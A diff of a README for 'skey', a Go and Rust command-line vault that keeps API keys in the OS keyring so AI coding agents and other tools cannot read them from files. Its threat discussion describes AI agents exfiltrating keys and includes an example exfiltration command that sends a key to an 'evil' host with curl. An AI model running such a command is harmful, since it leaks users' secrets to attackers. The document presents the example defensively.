@@ -1,18 +1,72 @@
-# senv — OS-keyring env vault (Go + Rust)
+# skey — a treasure box for secret keys 🔒
 
-Two interchangeable implementations sharing one OS-native store:
+Helpers like chat robots can read your files. Even free, open-source models
+with shell tools can run `printenv` or `cat`. So never leave keys lying around.
 
-- [`senv/`](senv/) — Go implementation (`go install`); canonical docs:
-  [`senv/README.md`](senv/README.md), [`senv/QUICKSTART.md`](senv/QUICKSTART.md),
-  [`senv/RUN_THREAT_MODEL.md`](senv/RUN_THREAT_MODEL.md)
-- [`senv-rs/`](senv-rs/) — Rust port (`cargo install`), same entries/index
+```sh
+# ❌ Don't do this — any person or tool that can read files can steal these
+API_KEY="sk-..."          # in ~/.zshrc / ~/.bashrc (history + ps can leak it)
+{ "key": "sk-..." }       # in auth.json (pi) — plain text on disk
+MY_KEY=sk-...             # in .env files — EVERY tool can read .env
+```
 
-Secrets live only in the OS keyring (macOS Keychain, Linux Secret Service,
-Windows Credential Manager). The local index holds entry names only.
+Why is that bad? Imagine your key is candy money. Anyone who opens the drawer
+can take it and spend it. That is what a file is: a drawer anyone can open.
 
-Start here: [`senv/README.md`](senv/README.md) — friendly guide with copy-paste
-recipes for pi, opencode, claude code, codex, aider, gemini CLI, and more.
+`skey` is a piggy bank instead. You drop a key in, it clicks shut. When a
+helper needs the key, YOU open it just a crack, just for that one job.
 
-> Note: this repo was initialized from a working directory that also contains
-> unrelated local folders; only `senv/`, `senv-rs/`, and these top-level
-> meta files are tracked.
+## Why the piggy bank is safer
+
+Keys live in your computer's own safe, not in files:
+
+- macOS Keychain, Linux Secret Service, Windows Credential Manager
+- Not a file, so `cat` / `printenv` on a file finds nothing
+- Each key has its own lock (per-entry access rules)
+- Nothing leaks into shell history, `ps`, or dotfiles
+
+## Two boxes, same piggy bank: Go and Rust
+
+`skey-go/` (Go) and `skey/` (Rust) share one safe and the same commands.
+Which is more secure? Honestly: **Rust**. Memory safety, secrets are wiped
+from memory (zeroize), no garbage collector leaving key copies around, and
+stricter builds. Go is faster to change and experiment with. Pick Rust for
+maximum paranoia, Go for hacking. Same service name `skey`, same key list.
+
+## The whole trick (4 lines)
+
+Install one box (pick one line):
+
+```sh
+cd skey-go && go install .              # Go -> skey
+# or: cd skey && cargo install --path .   # Rust (or: cargo install skey)
+```
+
+Then copy-paste:
+
+```sh
+skey set mykey prod                  # 1. drop a key in (typing is hidden)
+skey list                            # 2. see labels, never keys
+skey get mykey prod                  # 3. peek — ALWAYS asks: Allow access? [y/N]
+skey run mykey prod --env MY_KEY -- pi   # 4. lend the key to one command
+```
+
+Swap `MY_KEY` for the word your helper reads (`MISTRAL_API_KEY`, `OPENAI_API_KEY`, ...).
+
+## Two rules
+
+1. **`get` always asks.** There is no `--yes`. On purpose. A robot cannot click yes for you (prevents autonomous open-source agent exfiltration).
+2. **`run` is mittens mode.** The key goes straight into that one command's pocket, and the answer comes back with the key blacked out (`[REDACTED]`). Robots may add `-y`, but only for jobs YOU trust.
+
+## Honest box: is this secure? 🛡️
+
+No — it is hurdles, not a jail. It stops everyday accidents (sneaky `printenv`,
+history leaks, wrong program grabbing a key). But a tool that turns evil AND
+has internet can still smuggle the key out (`curl evil/$KEY`, clever re-typing).
+For a real wall you need containers, network rules, and allowlists. Full story
+in `skey-go/RUN_THREAT_MODEL.md`.
+
+## What next?
+
+Recipes for pi, opencode, claude, codex, omp, deepseek, antigravity, aider,
+gemini, and more live here: [`skey-go/README.md`](skey-go/README.md). Start there.
